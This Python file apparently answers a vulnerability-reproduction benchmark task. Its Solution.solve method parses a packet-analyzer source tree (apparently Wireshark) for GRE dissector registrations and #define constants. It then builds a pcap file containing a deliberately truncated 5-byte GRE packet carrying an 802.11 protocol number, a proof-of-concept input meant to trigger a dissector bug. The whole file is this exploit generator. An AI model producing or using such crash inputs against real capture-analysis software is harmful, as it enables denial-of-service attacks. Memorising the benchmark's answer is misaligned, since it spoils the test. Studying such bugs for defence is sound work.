import os
import re
import struct
import tarfile
from typing import Dict, Iterator, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        defines, candidates, linktype_gre = self._scan_source(src_path)

        proto = None
        for expr in candidates:
            proto = self._eval_c_int_expr(expr, defines)
            if proto is not None and 0 <= proto <= 0xFFFF:
                break

        if proto is None:
            for fallback in (0x0019, 0x88DC, 0x890D, 0x6558):
                proto = fallback
                break

        if linktype_gre is None:
            lt = self._eval_c_int_expr("LINKTYPE_GRE", defines)
            if lt is None:
                lt = self._eval_c_int_expr("DLT_GRE", defines)
            if lt is None:
                lt = 47
            linktype_gre = int(lt) & 0xFFFFFFFF

        gre_flags_ver = 0x0000
        gre_proto = int(proto) & 0xFFFF
        pkt = struct.pack("!HHB", gre_flags_ver, gre_proto, 0x00)  # 5 bytes

        pcap = b"".join(
            [
                struct.pack("<IHHiiii", 0xA1B2C3D4, 2, 4, 0, 0, 65535, int(linktype_gre)),
                struct.pack("<IIII", 0, 0, len(pkt), len(pkt)),
                pkt,
            ]
        )
        return pcap

    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cpp") or fn.endswith(".cc")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cpp") or name.endswith(".cc")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        yield name, f.read()
                    except Exception:
                        continue
        except Exception:
            return

    def _scan_source(self, src_path: str) -> Tuple[Dict[str, str], list, Optional[int]]:
        defines: Dict[str, str] = {}
        candidates = []
        linktype_gre: Optional[int] = None

        pat_gre_proto = re.compile(
            r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,\)]+)',
            re.S,
        )

        for name, data in self._iter_source_files(src_path):
            if not data:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    text = data.decode("latin-1", "ignore")
                except Exception:
                    continue

            text_noblock = re.sub(r"/\*.*?\*/", "", text, flags=re.S)

            for m in pat_gre_proto.finditer(text_noblock):
                arg = m.group(1).strip()
                if not arg:
                    continue
                low = arg.lower()
                if ("802" in low) or ("ieee" in low) or ("wifi" in low) or ("wlan" in low):
                    candidates.append(arg)

            for macro, expr in self._extract_defines(text_noblock):
                if macro in defines:
                    continue
                defines[macro] = expr

                if macro in ("LINKTYPE_GRE", "DLT_GRE"):
                    v = self._eval_c_int_expr(macro, defines)
                    if v is not None:
                        linktype_gre = int(v) & 0xFFFFFFFF

        if not candidates:
            for key in (
                "ETH_P_80211_RAW",
                "ETHERTYPE_IEEE_802_11",
                "ETHERTYPE_IEEE802_11",
                "ETHERTYPE_802_11",
                "ETHERTYPE_IEEE_802_11_RAW",
                "ETHERTYPE_WLAN",
                "ETHERTYPE_WIFI",
            ):
                if key in defines:
                    candidates.append(key)

        return defines, candidates, linktype_gre

    def _extract_defines(self, text: str) -> Iterator[Tuple[str, str]]:
        lines = text.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i]
            i += 1
            if "#define" not in line:
                continue

            if "//" in line:
                line = line.split("//", 1)[0]

            if not re.match(r"^\s*#\s*define\b", line):
                continue

            while line.rstrip().endswith("\\") and i < len(lines):
                nxt = lines[i]
                i += 1
                if "//" in nxt:
                    nxt = nxt.split("//", 1)[0]
                line = line.rstrip()[:-1] + " " + nxt

            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s*(.*)\s*$", line)
            if not m:
                continue
            name = m.group(1)
            rest = m.group(2).strip()

            if rest.startswith("("):
                if re.match(r"^\s*#\s*define\s+[A-Za-z_]\w*\s*\(", line):
                    continue

            if not rest:
                continue

            yield name, rest

    def _strip_number_suffixes(self, s: str) -> str:
        return re.sub(r"\b(0x[0-9A-Fa-f]+|\d+)(?:[uUlL]+)\b", r"\1", s)

    def _remove_casts(self, s: str) -> str:
        cast_pat = re.compile(
            r"\(\s*(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:long\s+)?(?:short\s+)?"
            r"(?:int|char|void|size_t|ssize_t|guint\d+|gint\d+|guint|gint|uint\d+_t|int\d+_t|gboolean|bool)"
            r"(?:\s*\*+)?\s*\)"
        )
        prev = None
        while prev != s:
            prev = s
            s = cast_pat.sub("", s)
        return s

    def _unwrap_simple_macros(self, s: str) -> str:
        for _ in range(3):
            s2 = re.sub(r"\b([A-Za-z_]\w*)\s*\(\s*(0x[0-9A-Fa-f]+|\d+)\s*\)", r"\2", s)
            if s2 == s:
                break
            s = s2
        return s

    def _eval_c_int_expr(self, expr: str, defines: Dict[str, str]) -> Optional[int]:
        memo: Dict[str, Optional[int]] = {}

        def resolve_ident(ident: str, depth: int = 0) -> Optional[int]:
            if ident in memo:
                return memo[ident]
            if depth > 50:
                memo[ident] = None
                return None
            if ident in ("NULL",):
                memo[ident] = 0
                return 0
            if ident in ("TRUE",):
                memo[ident] = 1
                return 1
            if ident in ("FALSE",):
                memo[ident] = 0
                return 0
            if ident not in defines:
                memo[ident] = None
                return None
            v = eval_expr(defines[ident], depth + 1)
            memo[ident] = v
            return v

        def eval_expr(e: str, depth: int = 0) -> Optional[int]:
            if depth > 50:
                return None
            e = e.strip()
            if not e:
                return None

            if "//" in e:
                e = e.split("//", 1)[0].strip()

            e = self._strip_number_suffixes(e)
            e = self._unwrap_simple_macros(e)
            e = self._remove_casts(e)

            e = e.replace("&&", " and ").replace("||", " or ")
            e = re.sub(r"(?<![<>=!])!(?!=)", " not ", e)

            e = re.sub(r"\b0+\b", "0", e)

            tokens = re.findall(
                r"0x[0-9A-Fa-f]+|\d+|[A-Za-z_]\w*|<<|>>|==|!=|<=|>=|[~^|&()+\-*/%<>]",
                e,
            )
            if not tokens:
                return None

            out = []
            for t in tokens:
                if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", t):
                    out.append(t)
                    continue
                if re.fullmatch(r"[A-Za-z_]\w*", t):
                    v = resolve_ident(t, depth + 1)
                    if v is None:
                        return None
                    out.append(str(int(v)))
                    continue
                out.append(t)

            pyexpr = " ".join(out)
            try:
                val = eval(pyexpr, {"__builtins__": None}, {})
            except Exception:
                return None

            if isinstance(val, bool):
                return int(val)
            if isinstance(val, int):
                return val
            try:
                return int(val)
            except Exception:
                return None

        if expr is None:
            return None
        expr = expr.strip()
        if not expr:
            return None

        if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", expr):
            try:
                return int(expr, 0)
            except Exception:
                return None

        if re.fullmatch(r"[A-Za-z_]\w*", expr):
            v = resolve_ident(expr)
            if v is not None:
                return int(v)
            return None

        return eval_expr(expr)